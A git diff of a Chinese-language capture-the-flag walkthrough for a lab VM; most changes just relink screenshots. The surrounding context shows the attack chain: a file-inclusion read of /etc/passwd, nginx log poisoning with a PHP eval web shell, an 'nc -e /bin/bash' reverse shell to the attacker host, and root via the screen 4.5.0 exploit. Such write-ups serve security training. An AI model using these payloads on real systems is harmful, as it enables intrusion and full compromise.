@@ -12,7 +12,7 @@
 netdiscover -r 192.168.80.0/24
 ```
 
-![image-20230806191613234](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191613234.png)
+![image-20230806191613234](./imgs/image-20230806191613234-1724412534659-19.png)
 
 **端口扫描**
 
@@ -20,33 +20,33 @@ netdiscover -r 192.168.80.0/24
 nmap -sV -p- 192.168.80.139
 ```
 
-![image-20230806191703134](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191703134.png)
+![image-20230806191703134](./imgs/image-20230806191703134-1724412533159-16.png)
 
 ### 漏洞发现
 
 浏览器访问80端口
 
-![image-20230806191746245](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191746245.png)
+![image-20230806191746245](./imgs/image-20230806191746245-1724412531316-13.png)
 
 找找有没有能够利用的地方，在`Contact`里发现了类似提交的 东西
 
-![image-20230806191836140](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191836140.png)
+![image-20230806191836140](./imgs/image-20230806191836140-1724412529508-10.png)
 
 发现点击`Submit`提交后，页面会发生变化
 
-![image-20230806191957268](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191957268.png)
+![image-20230806191957268](./imgs/image-20230806191957268-1724412527401-7.png)
 
-![image-20230806192005224](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192005224.png)
+![image-20230806192005224](./imgs/image-20230806192005224-1724412525485-4.png)
 
 用bp抓包看看
 
-![image-20230806192123109](./../../../%E6%A1%8C%E9%9D%A2/image-20230806192123109.png)
+![image-20230806192123109](./imgs/image-20230806192123109.png)
 
 将抓取到的数据包发送到`Repeater`，点击`Send`查看返回的数据
 
-![image-20230806192231489](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192231489.png)
+![image-20230806192231489](./imgs/image-20230806192231489-1724412510395-1.png)
 
-![image-20230806192247169](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192247169.png)
+![image-20230806192247169](./imgs/image-20230806192247169-1724412551247-22.png)
 
 不断点击，发现footer不断变化，说明这里可能存在一个独立的脚本文件
 
@@ -56,17 +56,17 @@ nmap -sV -p- 192.168.80.139
 dirsearch -u 192.168.80.139 -i 200
 ```
 
-![image-20230806192427575](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192427575.png)
+![image-20230806192427575](./imgs/image-20230806192427575-1724412556336-25.png)
 
 浏览器访问这个`http://192.168.80.139/footer.php` 目录
 
 每点击一次页面上的数字就会变
 
-![image-20230806192545346](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192545346.png)
+![image-20230806192545346](./imgs/image-20230806192545346-1724412560830-28.png)
 
 改成文件包含的形式`?file=`发现同样可以
 
-![image-20230806192924313](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192924313.png)
+![image-20230806192924313](./imgs/image-20230806192924313-1724412571385-31.png)
 
 确定这里存在文件包含漏洞
 
@@ -74,7 +74,7 @@ dirsearch -u 192.168.80.139 -i 200
 
 改变访问路径为`/thankyou.php?file=/etc/passwd` ，可以看到`passwd`文件内容了
 
-![image-20230806193235167](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806193235167.png)
+![image-20230806193235167](./imgs/image-20230806193235167-1724412590163-34.png)
 
 说明了程序代码在处理包含文件的时候没有严格控制。我们可以把访问路径更改为木马文件
 
@@ -82,7 +82,7 @@ dirsearch -u 192.168.80.139 -i 200
  /thankyou<?php @eval($_REQUEST[123]);?>
 ```
 
-![image-20230806193854240](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806193854240.png)
+![image-20230806193854240](./imgs/image-20230806193854240-1724412603518-37.png)
 
 发现报 `404未找到`的错误
 
@@ -94,7 +94,7 @@ dirsearch -u 192.168.80.139 -i 200
 
 
 
-![image-20230806195156826](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195156826.png)
+![image-20230806195156826](./imgs/image-20230806195156826-1724412620966-40.png)
 
 
 
@@ -104,7 +104,7 @@ dirsearch -u 192.168.80.139 -i 200
 http://192.168.80.139/thankyou.php?file=/var/log/nginx/access.log
 ```
 
-![image-20230806195305274](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195305274.png)
+![image-20230806195305274](./imgs/image-20230806195305274-1724412627642-43.png)
 
 接下来进行`反弹shell`
 
@@ -116,7 +116,7 @@ nc -lvvp 8989
 
 
 
-![image-20230806195427316](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195427316.png)
+![image-20230806195427316](./imgs/image-20230806195427316-1724412632471-46.png)
 
 利用中国蚁剑打开虚拟终端，反弹shell到攻击机kali上
 
@@ -124,13 +124,13 @@ nc -lvvp 8989
 nc -e /bin/bash 192.168.80.141 8989
 ```
 
-![image-20230806195624840](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195624840.png)
+![image-20230806195624840](./imgs/image-20230806195624840-1724412640571-49.png)
 
-![image-20230806195814105](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195814105.png)
+![image-20230806195814105](./imgs/image-20230806195814105-1724412644218-52.png)
 
 再看kali这边 ，就已经监听到了
 
-![image-20230806195829012](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195829012.png)
+![image-20230806195829012](./imgs/image-20230806195829012-1724412647197-55.png)
 
 
 
@@ -140,11 +140,11 @@ nc -e /bin/bash 192.168.80.141 8989
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![image-20230806200020629](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200020629.png)
+![image-20230806200020629](./imgs/image-20230806200020629-1724412649999-58.png)
 
 查看当前权限，发现只是普通的权限
 
-![image-20230806200057712](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200057712.png)
+![image-20230806200057712](./imgs/image-20230806200057712-1724412652544-61.png)
 
 **下一步就该提权了**
 
@@ -154,7 +154,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 find / -user root -perm /4000 2>/dev/null
 ```
 
-![image-20230806200209010](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200209010.png)
+![image-20230806200209010](./imgs/image-20230806200209010-1724412655013-64.png)
 
 发现`screen-4.5.0`比较可疑，尝试用`searchsploit`搜索是否存在漏洞
 
@@ -164,7 +164,7 @@ find / -user root -perm /4000 2>/dev/null
 searchsploit screen 4.5.0
 ```
 
-![image-20230806200344787](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200344787.png)
+![image-20230806200344787](./imgs/image-20230806200344787-1724412661814-67.png)
 
 找出`41154.sh`的绝对路径
 
@@ -174,7 +174,7 @@ searchsploit -p linux/local/41154.sh
 
 
 
-![image-20230806200639052](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200639052.png)
+![image-20230806200639052](./imgs/image-20230806200639052-1724412665783-70.png)
 
 查看文件内容
 
@@ -182,7 +182,7 @@ searchsploit -p linux/local/41154.sh
 cat /usr/share/exploitdb/exploits/linux/local/41154.sh 
 ```
 
-![image-20230806202051823](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202051823.png)
+![image-20230806202051823](./imgs/image-20230806202051823-1724412669660-73.png)
 
 按照文件的说明，可分为三部分，将第一个框里内容保存为第一文件，名为`libhax.c`，然后使用黄色选取的命令编译，编译结束会生成`libhax.so`文件。
 
@@ -192,53 +192,53 @@ cat /usr/share/exploitdb/exploits/linux/local/41154.sh
 
 第一个文件
 
-<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806201821999.png" alt="image-20230806201821999" style="zoom:33%;" />
+![image-20230806201821999](./imgs/image-20230806201821999-1724412676844-76.png)
 
 第二个文件
 
-<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202404740.png" alt="image-20230806202404740" style="zoom:33%;" />
+![image-20230806202404740](./imgs/image-20230806202404740-1724412686420-79.png)
 
 第三个文件
 
-<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202521089.png" alt="image-20230806202521089" style="zoom:33%;" />
+![image-20230806202521089](./imgs/image-20230806202521089-1724412688178-81.png)
 
 把`libhax.c和rootshell.c`拖进 蚁剑
 
-![image-20230806202906263](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202906263.png)
+![image-20230806202906263](./imgs/image-20230806202906263-1724412695501-85.png)
 
 对`libhax.c和rootshell.c`这两个文件进行编译
 
-![image-20230806203137321](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203137321.png)
+![image-20230806203137321](./imgs/image-20230806203137321-1724412700458-88.png)
 
 进到蚁剑的文件管理里面，刷新一下，就能看到编译好的两个文件了
 
-![image-20230806203244901](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203244901.png)
+![image-20230806203244901](./imgs/image-20230806203244901-1724412753602-102.png)
 
 然后把`run.sh`也拖进蚁剑里来， ==注意是`/tmp`下==
 
-![image-20230806203421888](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203421888.png)
+![image-20230806203421888](./imgs/image-20230806203421888-1724412727609-93.png)
 
 这个时候可以把`libhax.c和rootshell.c`这两个文件删除 ，因为已经编译好了，留他们也没有用了
 
-<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203726204.png" alt="image-20230806203726204" style="zoom:33%;" />
+![image-20230806203726204](./imgs/image-20230806203726204-1724412735092-96.png)
 
-<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203742381.png" alt="image-20230806203742381" style="zoom:33%;" />
+![image-20230806203742381](./imgs/image-20230806203742381-1724412745467-99.png)
 
 进到kali的python交互shell里，切换到`/tmp`目录下
 
-![image-20230806203854543](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203854543.png)
+![image-20230806203854543](./imgs/image-20230806203854543-1724412766825-105.png)
 
 运行`run.sh`  输入`bash ./run.sh` 提权
 
-![image-20230806204153258](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204153258.png)
+![image-20230806204153258](./imgs/image-20230806204153258-1724412769317-108.png)
 
 可以进行`whoami`查看我是谁
 
-![image-20230806204221570](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204221570.png)
+![image-20230806204221570](./imgs/image-20230806204221570-1724412784156-111.png)
 
-进到`/root`查看有无fl
+进到`/root`查看有无flag
 
-![image-20230806204344552](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204344552.png)
+![image-20230806204344552](./imgs/image-20230806204344552-1724412788883-114.png)
 
 ### 总结
 
